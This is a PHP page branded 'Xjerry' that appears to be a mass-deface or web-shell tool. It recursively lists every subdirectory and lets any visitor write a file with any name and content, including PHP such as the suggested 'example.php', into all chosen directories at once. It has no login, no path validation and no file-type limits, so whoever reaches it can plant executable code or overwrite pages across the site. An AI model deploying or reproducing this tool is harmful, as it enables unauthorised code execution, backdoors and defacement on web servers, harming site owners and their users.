<?php
session_start();

// Error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

$notification = "";

// Function to get all directories in the current directory
function getDirectories($dir) {
    $directories = [];
    $dirIterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir), RecursiveIteratorIterator::SELF_FIRST);

    foreach ($dirIterator as $file) {
        if ($file->isDir() && $file->getFilename() != '.' && $file->getFilename() != '..') {
            $relativePath = str_replace($dir . DIRECTORY_SEPARATOR, '', $file->getPathname());
            $directories[] = $relativePath;
        }
    }
    return $directories;
}

// Function to search and replace or create file with new content in target directories
function createOrUpdateFile($directory, $fileName, $newContent) {
    $filePath = rtrim($directory, '/') . DIRECTORY_SEPARATOR . $fileName;
    file_put_contents($filePath, $newContent);
    return "File $filePath has been successfully created/updated.";
}

// Handling form submission
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['directories']) && isset($_POST['file_name']) && !empty($_POST['file_name'])) {
    $selectedDirectories = $_POST['directories'];
    $newContent = $_POST['new_content'];
    $fileName = $_POST['file_name'];

    // Perform file creation or update for each selected directory
    foreach ($selectedDirectories as $directory) {
        $notification .= createOrUpdateFile($directory, $fileName, $newContent) . "<br>";
    }
}

// Get all directories in the current directory
$allDirectories = getDirectories('.');
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Directory Selector and Content Replacement - Xjerry</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #f0f8ff;
            font-family: Arial, sans-serif;
        }
        .container {
            margin-top: 50px;
        }
        .card {
            margin-bottom: 20px;
        }
        textarea {
            width: 100%;
            height: 200px;
            margin-top: 10px;
        }
        .popup {
            background-color: #4CAF50; /* Green */
            color: white;
            padding: 15px;
            border-radius: 5px;
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <h2>Select Directories and Replace Content - Xjerry</h2>
            </div>
            <div class="card-body">
                <?php if (!empty($notification)): ?>
                    <div id="popup" class="popup"><?php echo $notification; ?></div>
                    <script>
                        document.getElementById('popup').style.display = 'block';
                        setTimeout(function() {
                            document.getElementById('popup').style.display = 'none';
                        }, 5000); // Hide after 5 seconds
                    </script>
                <?php endif; ?>
                <form method="post" action="">
                    <div class="form-group">
                        <label>Select Directories:</label>
                        <div>
                            <input type="checkbox" id="all_directories" onclick="toggleAll(this)"> <label for="all_directories">All Directories</label>
                            <div style="margin-left: 20px;">
                                <?php foreach ($allDirectories as $dir): ?>
                                    <input type="checkbox" name="directories[]" value="<?php echo htmlspecialchars($dir); ?>" id="dir_<?php echo htmlspecialchars($dir); ?>"> 
                                    <label for="dir_<?php echo htmlspecialchars($dir); ?>"><?php echo htmlspecialchars($dir); ?></label><br>
                                <?php endforeach; ?>
                            </div>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="file_name">Enter the File Name to Create/Update:</label>
                        <input type="text" class="form-control" id="file_name" name="file_name" placeholder="example.php" required>
                    </div>
                    <div class="form-group">
                        <label for="new_content">Enter New HTML Content:</label>
                        <textarea id="new_content" name="new_content" required></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Create/Update File</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        function toggleAll(source) {
            checkboxes = document.querySelectorAll('input[type="checkbox"]');
            for (var i = 0; i < checkboxes.length; i++) {
                if (checkboxes[i] != source) {
                    checkboxes[i].checked = source.checked;
                }
            }
        }
    </script>
</body>
</html>
